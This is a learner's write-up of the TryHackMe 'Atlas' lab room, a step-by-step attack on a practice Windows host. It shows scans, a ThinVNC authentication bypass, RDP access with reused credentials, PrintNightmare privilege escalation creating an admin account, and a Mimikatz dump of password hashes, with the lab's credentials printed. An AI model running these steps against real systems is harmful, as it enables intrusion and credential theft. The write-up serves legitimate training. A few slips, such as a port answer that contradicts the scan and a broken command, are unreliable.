<h1 align="center">Atlas</h1>
<p align="center">2025, October 12<br>Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>524</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Hack the Atlas server in this beginner room covering Windows attack methodology</em>!<br>
<img width="80px" src="https://github.com/user-attachments/assets/afecd2cb-299b-4219-9dd3-3fbd443e676a"><br>
Access it <a href="https://tryhackme.com/room/atlas">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/4cf8e508-52ee-4914-8e4f-cf153a16a1f2"></p>

<h2>Task 1 . <code>Introduction</code> . Room Overview and Deploy!</h2>
<br>

<p><em>Answer the question below</em></p>

<br>
<p>1.1. Press the Green "Start Machine" button to deploy the machine!Note: It may take up to three minutes for this machine to fully boot.<br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . <code>Enumeration</code> . Room Enumeration</h2>
<br>

<p><em>Answer the questions below</em></p>

<br>
<p>2.1. Scan your target IP (10.201.75.19) with Nmap! Note: you will need the -Pn switch here. A complete command can be found in the hint.<br>
<code>No answer needed</code></p>

<br>
<p>2.2. With the Nmap default port range, you should find that two ports are open. What port numbers are these? Submit the answer as a comma-separated list from low to high, e.g. 80,443.<br>
<code>33,89,8080</code></p>

<br>
<p>2.3. What service does Nmap think is running on the higher of the two ports?<br>
<code>http-proxy</code></p>

<br>
<p>2.4. We would usually go on to do a lot more in-depth scanning, but we will leave it at that for this introductory room. We have what we need for the time being.<br>
<code>No answer needed</code></p>

```bash
:~/Atlas# nmap 10.201.75.19
...
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
...
```

```bash
:~/Atlas# nmap -Pn -p- -vv 10.201.75.19
...
Discovered open port 3389/tcp on 10.201.75.19
Discovered open port 8080/tcp on 10.201.75.19
Discovered open port 7680/tcp on 10.201.75.19
```

```bash
:~/Atlas# nmap -sC -sV -Pn -p- -vv 10.201.75.19
...
Discovered open port 3389/tcp on 10.201.75.19
Discovered open port 8080/tcp on 10.201.75.19
Discovered open port 7680/tcp on 10.201.75.19
```

```bash
:~/Atlas# nmap -sC -sV -Pn -p- -vv 10.201.75.19
...
Discovered open port 8080/tcp on 10.201.75.19
Discovered open port 3389/tcp on 10.201.75.19
...
Discovered open port 7680/tcp on 10.201.75.19
...
Discovered open port 5985/tcp on 10.201.75.19
Completed SYN Stealth Scan at 14:39, 104.36s elapsed (65535 total ports)
...
PORT     STATE SERVICE       REASON          VERSION
3389/tcp open  ms-wbt-server syn-ack ttl 128 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GAIA
|   NetBIOS_Domain_Name: GAIA
|   NetBIOS_Computer_Name: GAIA
|   DNS_Domain_Name: GAIA
|   DNS_Computer_Name: GAIA
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-12T13:40:57+00:00
| ssl-cert: Subject: commonName=GAIA
| Issuer: commonName=GAIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-11T13:33:07
| Not valid after:  2026-04-12T13:33:07
| MD5:   df10 43a8 c83a 0e73 715a fd0a d24f 0689
| SHA-1: da0a 955a 31f0 ff83 1a1d 2138 8940 bbd3 76b1 fb96
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQejK8dupJh6VF+NfGcjV1KzANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRHQUlBMB4XDTI1MTAxMTEzMzMwN1oXDTI2MDQxMjEzMzMwN1ow
| DzENMAsGA1UEAxMER0FJQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ANh6zdG+v4RtVvnH1EgeObXJ52c84OIaXBR3Yei43UzaqZwvSpTIhicXwH8uNcIJ
| EPn6/LT8hY8yCPBEauDZ+SbdZDu1mPSduHkrWe2MYPEZbJwAPPMzxTMg7boHPrme
| Zc831F65d0DFqc/HeHmV0iSAfiV5B2ufgjvo1r5bHNwEGOxEziPTj077xwlVqmPO
| jber7aDvqPc7uuAdbjfyDc1ZZPdbcMrdEwtAK6yqSyt6hEDlR99dAPJr4uJ1Enyl
| ByF4mHfkEDfB94I4OGfSp1TFM7g3bdg93Xt0C3Pe28Pnq4mec+GDh5GRRLvHkUO1
| CCfY9qcbKAffKFGpvCli45UCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAj5Bv0KEzy9JXUU4mYkCfN
| jnmGdNfrMQIx8c+fNxIux1ligJKQYelqs7gk7mYGSuWkqUJw0M8agU85BK02UVox
| KN7dtS31tH5Hc0GtMpvdrCxeS81CNO7j2Uzsqcz7Kl7sT2dnpf1jJFqC1L3jDlxm
| NmlqQQKriqxsh4HnPD9YoWRdrmLOVlqcJ6Kw52ENtjoYwt7+ZbCMp0T85z6mW74J
| dQtiv3UghxksuNWFPI8m7SHl6YteijQSIFMhlSAe0Aam6RugP0ZvzeLsB3r0095j
| D92ksyAQqVJOY6o9liUpGMalT4KDa7chSpK3GzChSXrIanlUAH7VcY4EWKY8+7kc
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-12T13:41:12+00:00; -1s from scanner time.
5985/tcp open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  tcpwrapped    syn-ack ttl 128
8080/tcp open  http-proxy    syn-ack ttl 128
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="YUFMNdJu5kCo10IC0m7mQA==", opaque="brVWIn1naORlv7s7CgsklVKNhKwN0GC41I"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
| http-auth: 
| HTTP/1.1 401 Access Denied\x0D
|_  Digest qop=auth opaque=QlxRuWWkpKmdjWRMbjQJ7IgDHZSa7ruxEO realm=ThinVNC nonce=st1lPtJu5kAo3kIC0m7mQA==
|_http-favicon: Unknown favicon MD5: CEE00174E844FDFEB7F56192E6EC9F5D
| http-methods: 
|_  Supported Methods: GET POST
|_http-title: 401 Access Denied
...
```

<br>
<h2>Task 3 . <code>Enumeration</code> . Service Enumeration</h2>
<br>

<p><em>Answer the question below</em></p>

<br>
<p>3.1. Use searchsploit to find the vulnerability in ThinVNC<br>
<code>No answer needed</code></p>


```bash
:~/Atlas# searchsploit thinvnc
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass                                                                                   | windows/remote/47519.py
------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```bash
:~/Atlas# searchsploit -m windows/remote/47519.py
...
    Codes: CVE-2019-17662
 Verified: True
File Type: Python script, ASCII text executable
...
```

<img width="1064" height="287" alt="image" src="https://github.com/user-attachments/assets/5df6642a-a09b-477f-aa66-c1634c9ef230" />


<br>
<br>
<br>

```bash
:~/Atlas# nmap -p 3389 -Pn -sV 10.201.75.19
...
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
...
```
<br>

```bash
:~/Atlas# nmap -p 8080 -Pn -sV 10.201.75.19
...
PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy
...
```

<br>

<img width="1130" height="364" alt="image" src="https://github.com/user-attachments/assets/3c6c5291-e1f4-4e6d-bf75-2f9fcb4f9aab" />

<br>
<br>
<br>

```bash
:~/Atlas# curl 10.201.75.19:8080 -v
*   Trying 10.201.75.19:8080...
* TCP_NODELAY set
* Connected to 10.201.75.19 (10.201.75.19) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.201.75.19:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="MRd8W9Ju5kAI30IC0m7mQA==", opaque="0e6ScETWPia1dmxbObbKch80tqJCmAjJej"
< 
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
* Connection #0 to host 10.201.75.19 left intact
```

<br>
<h2>Task 4 . <code>Attack</code> . Foothold</h2>
<br>

<p><em>Answer the question below</em></p>

<br>
<p>4.1. Clone the Git repository at https://github.com/MuirlandOracle/CVE-2019-17662  to your attacking machine. See if you can figure out how to do this in your terminal by yourself, otherwise, the command is given in the hint.<br>
<code>No answer needed</code></p>

```bash
:~/Atlas# git clone https://github.com/MuirlandOracle/CVE-2019-17662
Cloning into 'CVE-2019-17662'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 10 (delta 2), reused 10 (delta 2), pack-reused 0 (from 0)
Unpacking objects: 100% (10/10), 2.83 KiB | 1.42 MiB/s, done.
```

<br>
<p>4.2. Switch into the newly created exploit directory and set the file to be executable (chmod +x CVE-2019-17662.py) -- this may already be done for you, but better safe than sorry! Try executing the exploit -- you should see a help menu<br>
<code>No answer needed</code></p>

```bash
:~/Atlas/CVE-2019-17662# ls
CVE-2019-17662.py  README.md
```

```bash
:~/Atlas/CVE-2019-17662# chmod +x CVE-2019-17662.py
```

```bash
:~/Atlas/CVE-2019-17662# ./CVE-2019-17662.py
usage: CVE-2019-17662.py [-h] [-f FILE] [-s] [--accessible] host port
CVE-2019-17662.py: error: the following arguments are required: host, port
```

<br>
<p>4.3. Read through the exploit help menu. This script requires two arguments. Ascertain what these arguments are, then use the script to exploit the vulnerable service on the target..<br>
<code>No answer needed</code></p>

```bash
:~/Atlas/CVE-2019-17662# ./CVE-2019-17662.py -h
usage: CVE-2019-17662.py [-h] [-f FILE] [-s] [--accessible] host port

CVE-2019-17662 ThinVNC Arbitrary File Read

positional arguments:
  host                  The target IP or domain
  port                  The target port (1-65535)

optional arguments:
  -h, --help            show this help message and exit
  -f FILE, --file FILE  The file to read (default: ../ThinVnc.ini
  -s, --ssl             Does the server use SSL?
  --accessible          Remove banners and make exploit friendly for screen readers
```

<img width="1047" height="291" alt="image" src="https://github.com/user-attachments/assets/d1d5de11-4078-4a8f-a453-518bc42c4d74" />

<br>
<br>
<br>
<p>4.4. Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!br>
<code>No answer needed</code></p>

```bash
:~/Atlas/CVE-2019-17662# ./CVE-2019-17662.py 10.201.75.19 8080
```

<p>
 
- Username:	Atlas<br>
- Password:	H0ldUpTheHe@vens</p>

<br>
<br>
<br>
<h2>Task 5 . <code>Access</code> . VNC 🠖 RDP</h2>
<br>

<p><em>Answer the question below</em></p>

<br>
<p>5.1. Most people take the easy option when it comes to passwords, which makes password reuse incredibly common. With that in mind, use xfreerdp to connect to the target over RDP.<br>
<code>No answer needed</code></p>

:~/Atlas/CVE-2019-17662# xfreerdp /v:10.201.6.66 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp

```bash
:~/Atlas/CVE-2019-17662# xfreerdp /v:10.201.75.19 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

<img width="1233" height="648" alt="image" src="https://github.com/user-attachments/assets/25c043c5-9209-479f-bc25-e60f39213d5c" />

<br>
<br>
<br>
<h2>Task 6 . <code>Attack</code> . Privilege Escalation</h2>
<br>


<p><em>Answer the questions below</em></p>

<br>
<p>6.1. There are many different implementations of PrintNightmare available. You are advised to use a PowerShell version written by Caleb Stewart and John Hammond.<br>
<code>No answer needed</code></p>

<br>
<p>6.2. Navigate to the /tmp directory of your attacking VM, then clone the repository. Remember that /drive:/tmp,share argument in the xfreerdp command? It's about to come in useful.<br>
<code>No answer needed</code></p>

```bash
:/# cd /tmp && git clone https://github.com/calebstewart/CVE-2021-1675 && CVE-2021-1675 && 1
Cloning into 'CVE-2021-1675'...
remote: Enumerating objects: 40, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 40 (delta 1), reused 1 (delta 1), pack-reused 37 (from 1)
Unpacking objects: 100% (40/40), 127.15 KiB | 4.38 MiB/s, done.
CVE-2021-1675: command not found
```

<br>
<p>6.3. Inside your RDP session, open a new PowerShell Window.<br>
<code>No answer needed</code></p>

<br>
<p>6.4. The repository that we downloaded contains a PowerShell (.ps1) script that needs to be imported. We can import it using: . \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1  Make sure to include the dot at the start! This uses dot-syntax to import any functions exposed by the script. We are using \\tsclient\share to reference the share that we created. This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!<br>
<code>No answer needed</code></p>

<img width="1193" height="363" alt="image" src="https://github.com/user-attachments/assets/e8143fb8-1066-4d8f-b3a1-83430197f189" />

<br>
<br>
<br>
<p>6.5. Only one thing left to do: run the exploit! We can start the ball rolling by executing Invoke-Nightmare.<br>
<code>No answer needed</code></p>

<img width="1227" height="370" alt="image" src="https://github.com/user-attachments/assets/daf8c026-472f-439e-9c11-c8837e590403" />

<br>
<br>
<br>

<p>

- adm1n:P@ssw0rd</p>

<br>
<p>6.6. Notice that our payload mentions creating a new user called adm1n with a password of P@ssw0rd? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.
Regardless, we can now make use of our brand new admin account!<br>
<code>No answer needed</code></p>

<img width="1186" height="377" alt="image" src="https://github.com/user-attachments/assets/1f5b8376-0c0a-44b6-ba7f-fac5e56a0b4f" />

<br>
<br>
<br>

<img width="1220" height="469" alt="image" src="https://github.com/user-attachments/assets/3c050776-2c12-493a-9a60-058178c88c86" />

<br>
<br>
<br>

<img width="1062" height="296" alt="image" src="https://github.com/user-attachments/assets/3bc51b33-24cf-4c52-83f7-0d02683a4cea" />

<br>
<br>
<br>

<img width="1222" height="291" alt="image" src="https://github.com/user-attachments/assets/291e4176-c724-476b-873c-4655134c0b79" />

<br>
<br>
<br>
<p>6.7. We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator. The command is as follows: Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n. Execute this in your PowerShell session and follow the steps to spawn a new PowerShell process as an Administrator!<br>
<code>No answer needed</code></p>

<img width="1117" height="265" alt="image" src="https://github.com/user-attachments/assets/f30adf48-cdaf-439c-82a8-336f57bfbc3e" />

<br>
<br>
<br>

<img width="1120" height="455" alt="image" src="https://github.com/user-attachments/assets/5555a56b-30e3-48a4-b2c4-aa31b7e1ef0f" />

<br>
<br>
<br>

<img width="1191" height="239" alt="image" src="https://github.com/user-attachments/assets/1bd1278c-0ee0-4b8f-b79a-1d45741769d6" />

<br>
<br>
<br>

<img width="1204" height="481" alt="image" src="https://github.com/user-attachments/assets/8225c1c8-b867-4aef-8367-9cd9eef64f0b" />

<br>
<br>
<br>

<br>
<p>6.8. Run the command whoami /groups in the new window. You should see BUILTIN\Administrators in the list of groups, and a line at the bottom of the output containing Mandatory Label\High Mandatory Level. These mean that you are running as an administrator with full access over the machine. Congratulations!<br>
<code>No answer needed</code></p>

<img width="1219" height="487" alt="image" src="https://github.com/user-attachments/assets/ca372663-2ea3-4ffd-abe5-a9a59715e00f" />

<br>
<br>
<br>
<h2>Task 7 . <code>Attack</code> . Post Exploitation</h2>
<br>

<p><em>Answer the question below</em></p>

<br>
<p>7.1. First up, let's get an up-to-date copy of Mimikatz to our attacking machine. The code for the tool is publicly available on Github, but fortunately for the sake of simplicity, there are also pre-compiled versions available for download. Go to the releases page for Mimikatz and find the latest release at the top of the list. Download the file called mimikatz_trunk.zip to your attacking machine. Note: Certain browsers block the repository as being malicious. You're a hacker -- of course it's malicious. Just continue to the page anyway: it's perfectly safe.<br>
<code>No answer needed</code></p>

<img width="1120" height="552" alt="image" src="https://github.com/user-attachments/assets/2fb0ac49-af23-4719-b761-e1d32c310dac" />

<br>
<br>
<br>

<img width="1130" height="115" alt="image" src="https://github.com/user-attachments/assets/894eff32-7e09-470d-af74-4246ade2df1f" />

<br>
<br>
<br>
<p>7.2. Make sure that the zip file is in your /tmp directory, then unzip it with unzip mimikatz_trunk.zip<br>
<code>No answer needed</code></p>

```bash
:/tmp# unzip mimikatz_trunk.zip
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar      
  inflating: mimicom.idl             
  inflating: README.md               
   creating: Win32/
  inflating: Win32/mimidrv.sys       
  inflating: Win32/mimikatz.exe      
  inflating: Win32/mimilib.dll       
  inflating: Win32/mimilove.exe      
  inflating: Win32/mimispool.dll     
   creating: x64/
  inflating: x64/mimidrv.sys         
  inflating: x64/mimikatz.exe        
  inflating: x64/mimilib.dll         
  inflating: x64/mimispool.dll   
```

<img width="1207" height="307" alt="image" src="https://github.com/user-attachments/assets/cc5671e0-b6a1-448f-89e8-f052f2ced292" />

<br>
<br>
<br>
<p>7.3. Now we can get to work! Switch back into your RDP session and (using the elevated Command Shell we obtained in the last task) execute the following command to start Mimikatz: \\tsclient\share\x64\mimikatz.exe. If this is successful then you should get some pretty ASCII art and a new terminal prompt:<br>
<code>No answer needed</code></p>

```bash
PS  \\tsclient\share\x64\mimikatz.exe
```

<img width="1124" height="267" alt="image" src="https://github.com/user-attachments/assets/845d446e-ac9e-42f3-bdf7-419b2c955580" />

<br>
<br>
<br>
<p>7.4. When we start Mimikatz we usually have to execute two commands before we start dumping hashes:  privilege::debug -- this obtains debug privileges which (without going into too much depth in the Windows privilege structure) allows us to access other processes for "debugging" purposes. token::elevate -- simply put, this takes us from our administrative shell with high privileges into a SYSTEM level shell with maximum privileges. This is something that we have a right to do as an administrator, but that is not usually possible using normal Windows operations. With these commands executed, we are ready to dump some passwords hashes!<br>
<code>No answer needed</code></p>

<img width="1118" height="473" alt="image" src="https://github.com/user-attachments/assets/887fa581-2ee3-48ea-bbe6-78774ca58430" />

<br>
<br>
<br>
<p>7.5. There are a variety of commands we could use here, all of which do slightly different things. The command that we will use is: lsadump::sam. When executed, this will provide us with a list of password hashes for every account on the machine (with some extra information thrown in as well). The Administrator account password hash should be fairly near the top of the list:<br>
<code>No answer needed</code></p>

<br>
<p>7.6. What is the Administrator account's NTLM password hash?<br>
<code>c16444961f67af7eea7e420b65c8c3eb</code></p>

<img width="1111" height="704" alt="image" src="https://github.com/user-attachments/assets/10e30e3d-cea6-436a-a517-0ceeeb560a17" />

<br>
<br>
<br>
<h2>Task 8 . <code>Conclusion</code> . Final Toughts</h2>
<p>Congratulations -- you hacked Atlas!<br>

This was a beginner box which has hopefully provided you with some skills which will prove useful as you progress in your hacking journey. We covered initial exploitation of outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz.<br>

Kudos for completing the room: now go hack some more!</p>

<p><em>Answer the question below</em></p>

<br>
<p>8.1. I hacked Atlas!<br>
<code>No answer needed</code></p>

<br>
<br>
<br>
<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b5227d1a-5455-4f49-a466-2e960369bbc8"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/c6547bbf-bce5-43a2-96e3-63f28ffef068"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|12      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>


<p align="center">Global All Time:   101ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/bda6d771-c2f7-4a87-a098-dd71774935df"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/69abb7d6-57e7-46fe-849a-adec777b41f7"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d249fb21-fe45-4ceb-ad5d-6d471dd67dde"><br>
                  Global monthly:    217ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/aa536a83-c20f-4cd7-affe-8bcd9ebbc5b5"><br>
                  Brazil monthly:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/ddbfb068-56ff-43ac-9a87-e3d4ba4bb5ba"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
